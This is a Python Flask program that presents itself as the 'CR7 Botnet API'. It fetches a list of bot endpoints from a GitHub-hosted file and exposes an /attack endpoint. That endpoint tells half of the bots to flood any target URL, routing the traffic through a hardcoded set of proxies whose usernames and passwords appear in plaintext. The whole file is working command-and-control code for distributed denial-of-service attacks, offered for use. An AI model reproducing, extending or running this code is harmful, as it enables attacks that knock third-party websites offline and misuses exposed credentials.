import asyncio
import aiohttp
import httpx
import secrets
import threading
import random
from flask import Flask, request, jsonify

# --- CONFIGURATION ---
GITHUB_BOT_URL = "https://raw.githubusercontent.com/nkarthikraja-32/bot/main/bots.txt"
PORT = 80
MAX_CONCURRENT = 500                 # safe for Render's free tier
BOT_CMD_DURATION = 5                 # fixed internal duration per bot command

# --- PROXIES ---
RAW_PROXIES = [
    "142.111.48.253:7030:kphxofnm:7kzdjrsrl0ia",
    "23.95.150.145:6114:kphxofnm:7kzdjrsrl0ia",
    "45.38.107.97:6014:kphxofnm:7kzdjrsrl0ia",
    "38.154.203.95:5863:kphxofnm:7kzdjrsrl0ia",
    "198.105.121.200:6462:kphxofnm:7kzdjrsrl0ia",
    "198.23.243.226:6361:kphxofnm:7kzdjrsrl0ia",
    "84.247.60.125:6095:kphxofnm:7kzdjrsrl0ia",
    "23.27.208.120:5830:kphxofnm:7kzdjrsrl0ia",
    "23.229.19.94:8689:kphxofnm:7kzdjrsrl0ia",
    "2.57.20.2:6983:kphxofnm:7kzdjrsrl0ia"
]

def parse_proxy(raw):
    parts = raw.split(":")
    if len(parts) == 4:
        ip, port, user, pwd = parts
        return f"http://{user}:{pwd}@{ip}:{port}"
    return None

PROXY_LIST = [p for raw in RAW_PROXIES if (p := parse_proxy(raw)) is not None]

# --- GLOBAL STATE ---
BOT_ARMY = []

def sync_bot_army():
    global BOT_ARMY
    try:
        r = httpx.get(GITHUB_BOT_URL, timeout=10)
        r.raise_for_status()
        BOT_ARMY = [line.strip() for line in r.text.splitlines() if line.strip().startswith("http")]
        return len(BOT_ARMY)
    except Exception as e:
        print(f"Bot Army Sync Error: {e}")
        return 0

# --- ASYNC ATTACK CORE ---
async def hit_target(session, url, target, proxy):
    """Send command to a single bot (fixed duration)."""
    params = {"url": target, "duration": BOT_CMD_DURATION}
    try:
        async with session.get(url, params=params, proxy=proxy, timeout=5) as resp:
            return resp.status < 400
    except Exception:
        return False

async def launch_half_wave(target):
    """Select 50% of bots and fire exactly one wave."""
    if not BOT_ARMY:
        print("ERROR: Bot army is empty.")
        return {"status": "error", "reason": "bot_army_empty"}

    half_count = max(1, len(BOT_ARMY) // 2)
    selected = random.sample(BOT_ARMY, half_count)
    proxies = PROXY_LIST if PROXY_LIST else [None]

    connector = aiohttp.TCPConnector(limit=MAX_CONCURRENT, force_close=True)
    timeout = aiohttp.ClientTimeout(total=8, connect=3)
    sem = asyncio.Semaphore(MAX_CONCURRENT)

    async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
        tasks = []
        for i, bot_url in enumerate(selected):
            proxy = proxies[i % len(proxies)]
            async def _task(bot_url=bot_url, proxy=proxy):
                async with sem:
                    return await hit_target(session, bot_url, target, proxy)
            tasks.append(_task())

        results = await asyncio.gather(*tasks, return_exceptions=True)
        successes = sum(1 for r in results if r is True)

    return {
        "status": "completed",
        "bots_used": half_count,
        "successful": successes,
        "failed": half_count - successes,
        "total_bots": len(BOT_ARMY)
    }

# --- FLASK APP ---
app = Flask(__name__)
app.config['SECRET_KEY'] = secrets.token_hex(32)

@app.route('/')
def index():
    return jsonify({
        "api": "CR7 Botnet API",
        "endpoints": {
            "/attack?target=<url>": "Launch attack using 50% of bots (fixed 5s per bot)",
            "/sync": "Manually refresh bot list",
            "/status": "Show current bot count"
        }
    })

@app.route('/sync')
def manual_sync():
    count = sync_bot_army()
    return jsonify({"status": "synced", "bot_count": count})

@app.route('/status')
def status():
    return jsonify({"bot_count": len(BOT_ARMY)})

@app.route('/attack')
def attack():
    target = request.args.get('target')
    if not target:
        return jsonify({"error": "Missing target parameter"}), 400

    # Fire attack in background thread so API returns immediately
    def run_attack():
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        result = loop.run_until_complete(launch_half_wave(target))
        print(f"Attack result: {result}")

    threading.Thread(target=run_attack, daemon=True).start()
    return jsonify({
        "status": "attack_launched",
        "target": target,
        "bots_available": len(BOT_ARMY),
        "bots_to_use": max(1, len(BOT_ARMY) // 2)
    })

if __name__ == '__main__':
    count = sync_bot_army()
    print(f"Bot army synced: {count} nodes.")
    app.run(host="0.0.0.0", port=PORT)
